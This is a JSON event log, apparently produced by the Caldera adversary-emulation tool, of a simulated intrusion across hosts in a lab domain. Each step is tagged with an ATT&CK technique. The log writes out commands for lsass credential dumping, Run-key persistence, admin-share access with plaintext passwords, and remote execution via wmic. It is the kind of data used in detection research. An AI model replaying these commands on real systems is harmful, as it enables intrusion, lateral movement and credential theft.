{"producer_id": "Caldera", "bsf_version": "1.0", "bsf": [{"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "d17ca957-5675-404b-8b18-2bc800d16faa", "pid": 2720, "happened_before": "2017-05-01T18:59:03.361000+00:00", "happened_after": "2017-05-01T18:58:54.895000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "sounder-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T18:59:03.361000+00:00", "actor_pid": 2720, "happened_after": "2017-05-01T18:58:54.895000+00:00", "nodetype": "event", "object": "process", "host": "sounder-pc.brawlco.com", "id": "8e1f473b-869f-4cea-82d8-04e0901cd837"}, {"nodetype": "step", "events": ["d17ca957-5675-404b-8b18-2bc800d16faa", "8e1f473b-869f-4cea-82d8-04e0901cd837"], "id": "114da984-d6d5-43c3-9929-9f2d7423259b", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "f7094777-da91-4150-9910-20e014fa5295", "pid": 32, "happened_before": "2017-05-01T18:59:04.073000+00:00", "happened_after": "2017-05-01T18:59:03.959000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\and.exe /f"}, {"action": "add", "data": "C:\\and.exe", "id": "31fa6b6b-a292-4b6d-a6ed-e228301bfa4d", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T18:59:04.232000+00:00", "value": "caldera", "happened_after": "2017-05-01T18:59:03.935000+00:00", "nodetype": "event", "object": "registry", "host": "sounder-pc.brawlco.com", "fqdn": "sounder-pc.brawlco.com"}, {"nodetype": "step", "events": ["f7094777-da91-4150-9910-20e014fa5295", "31fa6b6b-a292-4b6d-a6ed-e228301bfa4d"], "id": "3d082397-8121-43da-b6d3-2c76775af927", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "e9f63d9e-5fba-49a3-8970-651f95cf394c", "pid": 1396, "happened_before": "2017-05-01T18:59:08.528000+00:00", "happened_after": "2017-05-01T18:59:04.365000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["e9f63d9e-5fba-49a3-8970-651f95cf394c"], "id": "7f9cf050-1193-4219-9060-ea39d6259567", "attack_info": [{"technique_name": "Remote System Discovery", "technique_id": "T1018", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "d7552bbd-08ca-424c-85ee-4ed174da1255", "pid": 2088, "happened_before": "2017-05-01T18:59:10.012000+00:00", "happened_after": "2017-05-01T18:59:09.836000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "nbtstat -n"}, {"nodetype": "step", "events": ["d7552bbd-08ca-424c-85ee-4ed174da1255"], "id": "8232b8f1-286a-4dbc-9286-d300a1e29b45", "attack_info": [{"technique_name": "Local Network Configuration Discovery", "technique_id": "T1016", "tactic": ["Discovery"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "baa2a199-3ada-476a-b1f5-e0d707bb52ea", "pid": 1440, "happened_before": "2017-05-01T18:59:15.051000+00:00", "happened_after": "2017-05-01T18:59:10.355000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["baa2a199-3ada-476a-b1f5-e0d707bb52ea"], "id": "6c647caf-fb40-40df-9d8f-e433279d1f62", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "63aa9d37-7d34-4440-9f3d-eea3e783e1f9", "pid": 2940, "happened_before": "2017-05-01T18:59:19.885000+00:00", "happened_after": "2017-05-01T18:59:15.939000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["63aa9d37-7d34-4440-9f3d-eea3e783e1f9"], "id": "0f087258-c27c-40d1-925b-16623ae65849", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "60d8b8a6-e22a-42c9-b149-977990a36c24", "pid": 2640, "happened_before": "2017-05-01T18:59:24.497000+00:00", "happened_after": "2017-05-01T18:59:20.530000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["60d8b8a6-e22a-42c9-b149-977990a36c24"], "id": "d40eaaaf-4b08-48ce-8198-2b8b795d6583", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "37e8201d-4741-4225-89bc-ab6ad4291214", "pid": 3656, "happened_before": "2017-05-01T18:59:29.225000+00:00", "happened_after": "2017-05-01T18:59:25.220000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["37e8201d-4741-4225-89bc-ab6ad4291214"], "id": "e81fd66f-5489-4df6-aafc-7747095ed96a", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "38eb69ce-214d-4662-b6f0-6e425d3e8878", "pid": 1636, "happened_before": "2017-05-01T18:59:33.948000+00:00", "happened_after": "2017-05-01T18:59:30.050000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["38eb69ce-214d-4662-b6f0-6e425d3e8878"], "id": "05689448-8d66-4a3d-a344-64473d6616e9", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "f1bbc2e0-b2b1-448d-b129-9db6c1b2af21", "pid": 164, "happened_before": "2017-05-01T18:59:38.715000+00:00", "happened_after": "2017-05-01T18:59:34.782000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["f1bbc2e0-b2b1-448d-b129-9db6c1b2af21"], "id": "4cd5de25-83fa-4e5a-91f9-208f0269cdd8", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "4ce3a096-9f03-4461-82bb-0cf643355394", "pid": 1224, "happened_before": "2017-05-01T18:59:43.392000+00:00", "happened_after": "2017-05-01T18:59:39.512000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["4ce3a096-9f03-4461-82bb-0cf643355394"], "id": "57235e54-0ced-42c0-97a2-31e147df70fb", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "ff3fda01-8ce2-4248-8e24-6950c483cabf", "pid": 4012, "happened_before": "2017-05-01T18:59:48.528000+00:00", "happened_after": "2017-05-01T18:59:44.311000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["ff3fda01-8ce2-4248-8e24-6950c483cabf"], "id": "bef5bdff-cadb-44e2-89bc-7cf16f76570f", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "611becec-6ac9-4e1f-a32f-f89514a4830e", "pid": 216, "happened_before": "2017-05-01T18:59:53.319000+00:00", "happened_after": "2017-05-01T18:59:49.396000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["611becec-6ac9-4e1f-a32f-f89514a4830e"], "id": "92ed6d30-7446-4abd-b013-0226443b6a4f", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "44164ec1-8fed-47df-aa87-8b68bc3a30e7", "pid": 2364, "happened_before": "2017-05-01T18:59:58.280000+00:00", "happened_after": "2017-05-01T18:59:54.213000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["44164ec1-8fed-47df-aa87-8b68bc3a30e7"], "id": "015e0d5d-b52f-4d25-b6af-0a66973251d7", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "28d43ea8-6263-4c89-aac5-f6ade8df9a39", "pid": 3348, "happened_before": "2017-05-01T19:00:03.230000+00:00", "happened_after": "2017-05-01T18:59:59.300000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["28d43ea8-6263-4c89-aac5-f6ade8df9a39"], "id": "0f14e5c0-04c3-4892-8551-08652e0bfba1", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "ac7d0d63-df54-4f95-ad3b-23b5f0148ca9", "pid": 3896, "happened_before": "2017-05-01T19:00:08.208000+00:00", "happened_after": "2017-05-01T19:00:04.336000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["ac7d0d63-df54-4f95-ad3b-23b5f0148ca9"], "id": "53cc1f02-dd63-426a-bbae-dee77999b07f", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "5402083f-b496-4e3c-9f0a-95ec37299c0c", "pid": 3176, "happened_before": "2017-05-01T19:00:13.653000+00:00", "happened_after": "2017-05-01T19:00:09.333000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["5402083f-b496-4e3c-9f0a-95ec37299c0c"], "id": "c4acd27a-ae29-4175-8820-7848e89c3706", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "39ac5f7b-4698-465e-88b3-6d8a0478122a", "pid": 1176, "happened_before": "2017-05-01T19:00:18.597000+00:00", "happened_after": "2017-05-01T19:00:14.684000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["39ac5f7b-4698-465e-88b3-6d8a0478122a"], "id": "0b206cbf-d5dd-4222-8b43-c445ae948ed1", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "6b670986-3f70-4e9e-9498-47999782ba80", "pid": 2960, "happened_before": "2017-05-01T19:00:23.682000+00:00", "happened_after": "2017-05-01T19:00:19.693000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["6b670986-3f70-4e9e-9498-47999782ba80"], "id": "288f03da-03c3-49d3-98cb-7f14825d5a7c", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "2e429ceb-c7ae-4c62-98c6-1a5ad423ec95", "pid": 2636, "happened_before": "2017-05-01T19:00:28.577000+00:00", "happened_after": "2017-05-01T19:00:24.751000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["2e429ceb-c7ae-4c62-98c6-1a5ad423ec95"], "id": "807723af-fdaf-4ecd-8cbc-6ce80116f280", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "2c17b194-d5e6-4ef4-8f6d-1544f4ef45a0", "pid": 1092, "happened_before": "2017-05-01T19:00:33.558000+00:00", "happened_after": "2017-05-01T19:00:29.628000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["2c17b194-d5e6-4ef4-8f6d-1544f4ef45a0"], "id": "78f17f99-9d94-4624-98e9-4b065844113b", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "b0f75da2-bdab-414b-b6ac-3ad7011ce826", "pid": 4000, "happened_before": "2017-05-01T19:00:38.623000+00:00", "happened_after": "2017-05-01T19:00:34.742000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "powershell -command -"}, {"nodetype": "step", "events": ["b0f75da2-bdab-414b-b6ac-3ad7011ce826"], "id": "32b2da43-8027-4f3f-b278-550ad7066085", "attack_info": [{"technique_name": "Permission Groups Discovery", "technique_id": "T1069", "tactic": ["Discovery"]}, {"technique_name": "Account Discovery", "technique_id": "T1087", "tactic": ["Discovery"]}, {"technique_name": "PowerShell", "technique_id": "T1086", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "b6642b62-0f8d-4a3a-8b99-1e3af9847007", "pid": 3472, "happened_before": "2017-05-01T19:00:40.009000+00:00", "happened_after": "2017-05-01T19:00:39.824000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "net use \\\\mims-pc.brawlco.com\\C$ X#IKwlYrX%X#5 /user:brawlco\\cmims"}, {"nodetype": "step", "events": ["b6642b62-0f8d-4a3a-8b99-1e3af9847007"], "id": "90efeb73-3968-4024-be8e-47a9c5d2323d", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "be4bf792-8d34-4818-9dd1-9a298352a913", "pid": 3968, "happened_before": "2017-05-01T19:00:40.928000+00:00", "happened_after": "2017-05-01T19:00:40.738000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\and.exe\" \"\\\\mims-pc.brawlco.com\\C$\\raised.exe\""}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "file_path": "C:\\raised.exe", "happened_before": "2017-05-01T19:00:41.179000+00:00", "happened_after": "2017-05-01T19:00:40.670000+00:00", "nodetype": "event", "object": "file", "host": "mims-pc.brawlco.com", "id": "c1a2b7a6-ba29-4029-a57f-c798ddde88c5"}, {"nodetype": "step", "events": ["be4bf792-8d34-4818-9dd1-9a298352a913", "c1a2b7a6-ba29-4029-a57f-c798ddde88c5"], "id": "ee5acd52-cd8b-464f-9f8d-0e9cf8794685", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "32153961-30da-4cfe-9b8c-61a5f890d22e", "pid": 2116, "happened_before": "2017-05-01T19:00:42.247000+00:00", "happened_after": "2017-05-01T19:00:41.678000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "wmic /node:\"mims-pc.brawlco.com\" /user:\"brawlco\\cmims\" /password:\"X#IKwlYrX%X#5\" process call create \"C:\\raised.exe -d -f\""}, {"nodetype": "step", "events": ["32153961-30da-4cfe-9b8c-61a5f890d22e"], "id": "cebe1c13-947c-44b3-9ad0-d17c5e6e7347", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "986d9040-3595-4fb0-9b13-3dcd080807d0", "pid": 1964, "happened_before": "2017-05-01T19:00:52.026000+00:00", "happened_after": "2017-05-01T19:00:42.980000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "mims-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:00:52.026000+00:00", "actor_pid": 1964, "happened_after": "2017-05-01T19:00:42.981000+00:00", "nodetype": "event", "object": "process", "host": "mims-pc.brawlco.com", "id": "4f7c45db-040e-4418-9985-2973e3bba75f"}, {"nodetype": "step", "events": ["986d9040-3595-4fb0-9b13-3dcd080807d0", "4f7c45db-040e-4418-9985-2973e3bba75f"], "id": "c7c230d3-d55e-478d-911f-96b4b14bac6e", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "28980e59-3b4f-4021-a05e-68f6008218f7", "pid": 312, "happened_before": "2017-05-01T19:00:53.575000+00:00", "happened_after": "2017-05-01T19:00:53.441000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\raised.exe /f"}, {"action": "add", "data": "C:\\raised.exe", "id": "92b28ba1-a6f1-4fca-b510-690393594de7", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:00:54.029000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:00:53.367000+00:00", "nodetype": "event", "object": "registry", "host": "mims-pc.brawlco.com", "fqdn": "mims-pc.brawlco.com"}, {"nodetype": "step", "events": ["28980e59-3b4f-4021-a05e-68f6008218f7", "92b28ba1-a6f1-4fca-b510-690393594de7"], "id": "3c552337-ac89-4960-bb54-ba11bcb6f19f", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "a411b87a-423f-4cc2-96cf-f891a0802b70", "pid": 1792, "happened_before": "2017-05-01T19:00:54.913000+00:00", "happened_after": "2017-05-01T19:00:54.727000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "net use \\\\ostermeyer-pc.brawlco.com\\C$ ]ASj3nuafx /user:brawlco\\mostermeyer"}, {"nodetype": "step", "events": ["a411b87a-423f-4cc2-96cf-f891a0802b70"], "id": "7459b42b-f40a-42f2-b4ed-c955d537dfdc", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "sounder-pc.brawlco.com", "id": "fba22694-20e5-489f-9a09-277f9cee5d95", "pid": 1296, "happened_before": "2017-05-01T19:00:58.779000+00:00", "happened_after": "2017-05-01T19:00:55.835000+00:00", "nodetype": "event", "object": "process", "ppid": 3468, "host": "sounder-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\and.exe\" \"\\\\ostermeyer-pc.brawlco.com\\C$\\born.exe\""}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "file_path": "C:\\born.exe", "happened_before": "2017-05-01T19:00:59.149000+00:00", "happened_after": "2017-05-01T19:00:55.758000+00:00", "nodetype": "event", "object": "file", "host": "ostermeyer-pc.brawlco.com", "id": "019ce0ed-5e71-4267-acd9-8f108f76c2f5"}, {"nodetype": "step", "events": ["fba22694-20e5-489f-9a09-277f9cee5d95", "019ce0ed-5e71-4267-acd9-8f108f76c2f5"], "id": "328ec0f4-a160-4e3f-af65-26b683884c50", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "10e5c979-b1b3-43f3-b914-dfe796db2bdb", "pid": 2892, "happened_before": "2017-05-01T19:01:00.753000+00:00", "happened_after": "2017-05-01T19:00:59.792000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "wmic /node:\"ostermeyer-pc.brawlco.com\" /user:\"brawlco\\mostermeyer\" /password:\"]ASj3nuafx\" process call create \"C:\\born.exe -d -f\""}, {"nodetype": "step", "events": ["10e5c979-b1b3-43f3-b914-dfe796db2bdb"], "id": "4e8b04b4-411d-4657-866c-fd37199d65a7", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "a3c40bb0-d5ef-4911-80df-9dddd0f18f85", "pid": 600, "happened_before": "2017-05-01T19:01:17.768000+00:00", "happened_after": "2017-05-01T19:01:02.163000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": "ostermeyer-pc.brawlco.com", "file_path": "C:\\Windows\\System32\\lsass.exe", "happened_before": "2017-05-01T19:01:17.768000+00:00", "actor_pid": 600, "happened_after": "2017-05-01T19:01:02.163000+00:00", "nodetype": "event", "object": "process", "host": "ostermeyer-pc.brawlco.com", "id": "f27f1a7a-eb36-4280-a7d2-fb4bb6799cde"}, {"nodetype": "step", "events": ["a3c40bb0-d5ef-4911-80df-9dddd0f18f85", "f27f1a7a-eb36-4280-a7d2-fb4bb6799cde"], "id": "7e41da92-0a27-45d3-8fbe-1cb04ff8105c", "attack_info": [{"technique_name": "Credential Dumping", "technique_id": "T1003", "tactic": ["Credential Access"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "7acc55fa-f891-470b-9878-ef57efcd2bc8", "pid": 3804, "happened_before": "2017-05-01T19:01:19.956000+00:00", "happened_after": "2017-05-01T19:01:19.799000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v caldera /d C:\\born.exe /f"}, {"action": "add", "data": "C:\\born.exe", "id": "f5657128-1dc6-41a2-a3cb-5c4747b1a004", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "happened_before": "2017-05-01T19:01:20.398000+00:00", "value": "caldera", "happened_after": "2017-05-01T19:01:19.712000+00:00", "nodetype": "event", "object": "registry", "host": "ostermeyer-pc.brawlco.com", "fqdn": "ostermeyer-pc.brawlco.com"}, {"nodetype": "step", "events": ["7acc55fa-f891-470b-9878-ef57efcd2bc8", "f5657128-1dc6-41a2-a3cb-5c4747b1a004"], "id": "9672af36-232d-4e18-9781-e77ba006aa29", "attack_info": [{"technique_name": "Registry Run Keys / Start Folder", "technique_id": "T1060", "tactic": ["Persistence"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "aa39d978-8dd0-4322-b71a-21aac3c00d5e", "pid": 3984, "happened_before": "2017-05-01T19:01:21.839000+00:00", "happened_after": "2017-05-01T19:01:21.479000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "net use \\\\santilli-pc.brawlco.com\\C$ r%Md%1#b5X /user:brawlco\\psantilli"}, {"nodetype": "step", "events": ["aa39d978-8dd0-4322-b71a-21aac3c00d5e"], "id": "8900f165-7de4-4e9d-a40f-c173288f8407", "attack_info": [{"technique_name": "Windows Admin Shares", "technique_id": "T1077", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "ostermeyer-pc.brawlco.com", "id": "ce4860a2-ada3-4cfc-bf87-604270b647ef", "pid": 2488, "happened_before": "2017-05-01T19:01:23.514000+00:00", "happened_after": "2017-05-01T19:01:23.160000+00:00", "nodetype": "event", "object": "process", "ppid": 3752, "host": "ostermeyer-pc.brawlco.com", "command_line": "cmd /c copy \"C:\\born.exe\" \"\\\\santilli-pc.brawlco.com\\C$\\born.exe\""}, {"action": "create", "fqdn": "santilli-pc.brawlco.com", "file_path": "C:\\born.exe", "happened_before": "2017-05-01T19:01:23.833000+00:00", "happened_after": "2017-05-01T19:01:23.068000+00:00", "nodetype": "event", "object": "file", "host": "santilli-pc.brawlco.com", "id": "840e8274-29a7-4114-9e88-31c5de6ad85d"}, {"nodetype": "step", "events": ["ce4860a2-ada3-4cfc-bf87-604270b647ef", "840e8274-29a7-4114-9e88-31c5de6ad85d"], "id": "103c078e-b468-4951-8598-c97fd141b8c7", "attack_info": [{"technique_name": "Remote File Copy", "technique_id": "T1105", "tactic": ["Lateral Movement"]}]}, {"action": "create", "fqdn": "mims-pc.brawlco.com", "id": "cdb04625-2e90-4c49-bb4a-e3d4271c63f6", "pid": 1376, "happened_before": "2017-05-01T19:01:24.995000+00:00", "happened_after": "2017-05-01T19:01:24.551000+00:00", "nodetype": "event", "object": "process", "ppid": 3764, "host": "mims-pc.brawlco.com", "command_line": "wmic /node:\"santilli-pc.brawlco.com\" /user:\"brawlco\\psantilli\" /password:\"r%Md%1#b5X\" process call create \"C:\\born.exe -d -f\""}, {"nodetype": "step", "events": ["cdb04625-2e90-4c49-bb4a-e3d4271c63f6"], "id": "6741d45f-159a-4760-a90c-27208f5d6505", "attack_info": [{"technique_name": "Windows Management Instrumentation", "technique_id": "T1047", "tactic": ["Execution"]}]}, {"action": "create", "fqdn": "santilli-pc.brawlco.com", "id": "f96f2192-299a-4640-a753-020617bbe8c7", "pid": 3856, "happened_before": "2017-05-01T19:01:38.013000+00:00", "happened_after": "2017-05-01T19:01:26.695000+00:00", "nodetype": "event", "object": "process", "ppid": 4004, "host": "santilli-pc.brawlco.com", "command_line": "powershell -command -"}, {"action": "open", "fqdn": 